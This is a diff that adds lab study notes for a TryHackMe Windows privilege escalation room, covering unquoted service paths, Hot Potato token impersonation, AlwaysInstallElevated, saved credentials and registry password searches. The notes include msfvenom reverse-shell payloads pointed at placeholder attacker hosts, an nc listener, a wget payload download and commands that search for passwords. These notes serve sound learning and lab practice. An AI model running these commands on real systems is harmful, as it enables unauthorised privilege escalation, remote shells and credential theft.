@@ -73,3 +73,54 @@ https://tryhackme.com/room/winprivesc
     * x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
     * sc stop dllsvc
     * sc start dllsvc
+
+# Task 6 - unquoted service path
+* when the binary path to a service is not enclosed in quotes
+* unquoted: c:\program files\program\abc.exe
+* quoted: "c:\program files\program\abc.exe"
+* how to find unquoted service paths
+    * winpeas
+    * powerup
+* check writable permissions of a directory
+    * accesschk64.exe /accepteula -uwdq "c:\program files\"
+* sc qc unquotedsvc
+* msfvenom can be used to create a simple reverse shell to exploit the vulnerable unquoted service path
+    * attacker: msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attacker_ip] LPORT=[attacker_port] -f exe > Common.exe
+    * attacker: python -m http.server 8383
+    * attacker: nc -nvlp [attacker_port]
+    * target: wget -O Common.exe http://[attacker_ip]:8383/Common.exe
+    * target: copy Common.exe "c:\program files\unquoted path service\Common.exe"
+    * target: sc start unquotedsvc
+    * attacker: catch shell
+
+# Task 7 - token impersonation
+* security tokens can be used by the user through impersonation
+* whoami /priv
+* exploits
+    * hot potato example
+        * 1 - look for systems that use wpad
+        * 2 - request intercepted by exploit, redirected to 127.0.0.1
+        * 3 - target asks for proxy config - wpad.dat
+        * 4 - malicous wpad.dat is sent to target
+        * 5 - target system tries to connect to proxy through malicious wpad.dat
+        * 6 - exploit asks target to perform NTLM auth
+        * 7 - target sends NTLM handshake
+        * 8 - handshake is received and relayed to an SMB service to create a process, this process has the privilege level of the service (wpad) that was targeted
+
+# Task 8 - quick wins
+* scheduled tasks
+    * schtasks
+* alwaysinstallelevated
+    * reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+    * reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+    * attacker: msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attacker_ip] LPORT=[attacker_port] -f msi -o mal.msi
+    * target: msiexec /quiet /qn /i mal.msi
+* saved creds
+    * cmdkey /list
+    * runas
+    * runas /savecred /user:admin shell.exe
+* reg keys
+    * reg query HKLM /f password /t REG_SZ /s
+    * reg query HKCU /f password /t REG_SZ /s
+* unattend files
+    * files that should have been deleted after setup
